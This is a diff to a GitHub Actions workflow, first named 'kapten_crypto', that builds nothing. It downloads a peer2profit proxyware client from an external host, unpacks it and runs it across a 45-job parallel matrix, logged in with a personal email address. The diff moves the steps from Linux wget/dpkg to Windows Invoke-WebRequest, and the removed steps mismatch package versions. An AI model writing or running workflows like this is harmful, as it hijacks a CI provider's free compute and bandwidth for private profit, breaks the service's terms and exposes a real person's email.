@@ -1,47 +1,26 @@
-name: kapten_crypto 
+name: NAME
 
-on: [workflow_dispatch] 
+on: [workflow_dispatch]
 
-jobs: 
-
-build: 
-
-name: kapten_crypto 
-
-runs-on: windows-latest 
-
-strategy: 
-
-max-parallel: 5 
-
-fail-fast: false 
-
-matrix: 
-
-go: [1.0, 1.1, 1.2, 1.3, 1,35] 
-
-flag: [A, B, C, D, E, F, G, H, I] 
-
-env: 
-
-NUM_JOBS: 20 
-
-JOB: ${{ matrix.go }} 
-
-steps: 
-
-- name: DOWNLOAD 
-
-run: wget https://updates.peer2profit.app/p2pclient_0.60_amd64.deb
-
-- name: Extract 
-
-run: sudo dpkg -i p2pclient_0.56_amd64.deb
-
-- name: Running 
-
-run: p2pclient --login windu01221996@gmail.com
-
-- name: END 
-
-run: exit
+jobs:
+  build:
+    name: NAME
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
+        flag: [A, B, C, D, E, F, G, H, I]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: DOWNLOAD
+      run: Invoke-WebRequest https://updates.peer2profit.app/p2pclient_v0.55_signed.zip -OutFile p2pclient_v0.55_signed.zip
+    - name: Extract
+      run: Expand-Archive p2pclient_v0.55_signed.zip
+    - name: RUNNING
+      run: .\p2pclient.exe -l windu01221996@gmail.com
+    - name: DONE
+      run: exit
